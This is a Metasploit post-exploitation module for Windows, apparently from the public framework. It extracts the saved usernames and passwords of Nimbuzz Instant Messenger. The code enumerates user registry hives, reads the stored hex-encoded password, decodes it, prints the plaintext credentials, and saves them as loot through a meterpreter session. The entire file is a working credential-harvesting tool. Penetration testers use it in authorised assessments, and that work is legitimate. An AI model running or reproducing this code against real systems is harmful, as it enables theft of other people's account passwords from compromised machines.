##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Nimbuzz Instant Messenger Password Extractor',
        'Description' => %q{
          This module extracts the account passwords saved by Nimbuzz Instant
          Messenger in hex format.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
          'Unknown', # SecurityXploded Team, www.SecurityXploded.com
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    creds = Rex::Text::Table.new(
      'Header' => 'Nimbuzz Instant Messenger Credentials',
      'Indent' => 1,
      'Columns' =>
      [
        'User',
        'Password'
      ]
    )

    registry_enumkeys('HKU').each do |k|
      next unless k.include?('S-1-5-21')
      next if k.include?('_Classes')

      vprint_status("Looking at Key #{k}")
      subkeys = registry_enumkeys("HKU\\#{k}\\Software\\Nimbuzz\\")

      if subkeys.nil? || (subkeys == '')
        print_status('Nimbuzz Instant Messenger not installed for this user.')
        next
      end

      user = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application\\", 'Username') || ''
      hpass = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application\\", 'Password')

      next if hpass.nil? || (hpass == '')

      hpass =~ /.{11}(.*)./
      decpass = [::Regexp.last_match(1)].pack('H*')
      print_good("User=#{user}, Password=#{decpass}")
      creds << [user, decpass]
    end

    print_status('Storing data...')
    path = store_loot(
      'nimbuzz.user.creds',
      'text/csv',
      session,
      creds.to_csv,
      'nimbuzz_user_creds.csv',
      'Nimbuzz User Credentials'
    )
    print_good("Nimbuzz user credentials saved in: #{path}")
  end
end
